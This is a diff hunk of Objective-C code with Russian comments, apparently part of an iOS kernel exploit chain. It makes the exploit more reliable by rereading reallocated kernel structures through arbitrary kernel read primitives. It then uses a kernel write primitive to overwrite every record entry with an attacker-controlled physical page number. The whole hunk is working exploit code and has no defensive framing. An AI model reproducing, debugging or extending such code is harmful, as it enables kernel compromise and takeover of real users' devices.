@@ -8002,12 +8002,29 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
         // 1.9.266 (р.66): L5 — буфер мог быть перевыделён на прошлом submit
         // (перечитываем [hdr+0x10]; переехал → свежие оригиналы с нового VA);
         // L6 — патчим ВСЕ записи на каждой попытке (сериализатор их перечитывает).
-        if (allBuf && hdr247) {
-            uint64_t curBuf = kp_untag_ptr(early_kread64(hdr247 + 0x10));
-            if (curBuf && curBuf != allBuf) {
-                for (uint32_t i = 0; i < allCnt; i++) allOld[i] = early_kread64(curBuf + 0x30 + (uint64_t)i * 8);
-                allBuf = curBuf;
-                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] L5: record buffer перевыделен → %#llx — перепатчены все записи", (unsigned long long)curBuf]);
+        // 1.9.269 (р.67): конвергенция на уровне PD — [surf+0x30] подменяется
+        // между патчем и submit (MD maintenance per-plane) → наш буфер сирота.
+        // Перечитываем pd каждую попытку; сменился → полная перерезолвка.
+        if (allBuf && pd247) {
+            uint64_t curPd = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+            if (curPd && curPd != pd247) {
+                pd247 = curPd;
+                hdr247 = kp_untag_ptr(early_kread64(pd247 + 0x90));
+                uint64_t nb = hdr247 ? kp_untag_ptr(early_kread64(hdr247 + 0x10)) : 0;
+                uint32_t nc = nb ? (uint32_t)early_kread64(nb + 0x28) : 0;
+                if (nb && nc && nc <= 64) {
+                    for (uint32_t i = 0; i < nc; i++) allOld[i] = early_kread64(nb + 0x30 + (uint64_t)i * 8);
+                    allCnt = nc; allBuf = nb;
+                    kpNote(r, [NSString stringWithFormat:@"  [CHAIN] р.67: pd ПОДМЕНЁН → %#llx, новый буфер %#llx (%u записей) — перепатчено",
+                              (unsigned long long)curPd, (unsigned long long)nb, nc]);
+                }
+            } else if (curPd == pd247) {
+                uint64_t curBuf = kp_untag_ptr(early_kread64(hdr247 + 0x10));
+                if (curBuf && curBuf != allBuf) {
+                    for (uint32_t i = 0; i < allCnt; i++) allOld[i] = early_kread64(curBuf + 0x30 + (uint64_t)i * 8);
+                    allBuf = curBuf;
+                    kpNote(r, [NSString stringWithFormat:@"  [CHAIN] L5: record buffer перевыделен → %#llx — перепатчены все записи", (unsigned long long)curBuf]);
+                }
             }
             for (uint32_t i = 0; i < allCnt; i++)
                 early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, (allOld[i] & 0xffffffff00000000ULL) | ctlPFN);
